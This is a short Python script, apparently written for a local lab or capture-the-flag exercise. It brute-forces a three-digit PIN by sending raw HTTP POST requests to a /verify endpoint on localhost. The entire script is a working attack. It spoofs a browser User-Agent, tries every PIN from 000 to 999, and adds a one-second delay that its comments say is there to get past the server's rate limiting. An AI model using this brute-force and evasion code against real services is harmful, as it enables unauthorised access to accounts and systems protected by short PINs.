#the time that i create a delay to fix the "wow, slow down" issue of the server response
#also adding the OK body response from the server to check if the server response or just the program work but not within the server
#still the part that doesn't understand that i use the wrong body like...
#...instead of using POST i use GET body of the HTML or the HTTP of the server on this code
import socket
import time

host = "127.0.0.1"
port = 8888

def send_request(pin):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        request = f"POST /verify HTTP/1.1\r\n"
        request += f"Host: {host}:{port}\r\n"
        request += "Connection: close\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\r\n"
        request += f"Content-Length: {len(f'magicNumber={pin}')}\r\n"
        request += "\r\n"
        request += f"magicNumber={pin}\r\n"
        
        s.sendall(request.encode())
        
        response = s.recv(4096).decode()
        return response

for i in range(1000):
    pin = f"{i:03}" 
    
    print(f"Trying PIN: {pin}")
    
    response = send_request(pin)
    
    if "success" in response.lower():
        print(f"Success! The correct PIN is: {pin}")
        break
    else:
        print(f"Failed attempt: {pin}")
    
    time.sleep(1)
